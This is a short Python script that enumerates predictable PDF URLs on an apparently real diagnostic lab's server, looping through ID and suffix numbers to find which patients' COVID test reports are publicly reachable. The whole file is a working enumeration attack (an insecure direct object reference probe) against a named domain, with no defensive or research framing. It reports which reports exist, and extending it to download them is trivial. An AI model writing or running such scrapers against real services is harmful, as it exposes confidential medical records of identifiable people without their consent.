import requests
from pprint import pprint

base_url = 'http://reports.okaydiagnostic.com/upload/CovidReports/'
#vai = '19472'
dash = '_'
number = '2'
suffix = '.pdf'
count = 0

def getReports(startVAI, endVAI, count_init):
    count = count_init
    for vai in range(startVAI, endVAI):
        # if it's first VAI, update count!
        if vai == startVAI:
            count = findVAI_num(vai)
            fetchReport(vai, count)
        else:
            count += 1
            fetchReport(vai, count)

# TODO Not in use
def fetchReport(vai, count):
    url = base_url + str(vai) + dash + str(count) + suffix
    res = requests.get(url)
    if res.status_code == 200:
        print(f"\u001b[35m {count} Found Report \u001b[0m")
    else:
        raise Exception("Report doesn't exist.")

def findVAI_num(vai):
    for i in range(0, 25):
        url = base_url + str(vai) + dash + str(i) + suffix
        res = requests.get(url)
        if res.status_code == 200:
            print(f"\u001b[32m VAI: {vai}_{i} Found Report \u001b[0m")
            return i
        else:
            print(f"\u001b[31m VAI: {vai}_{i} Not found \u001b[0m")

#findVAI_num(input("VAI: "))

if __name__ == '__main__':
    getReports(19326, 19410, 0)
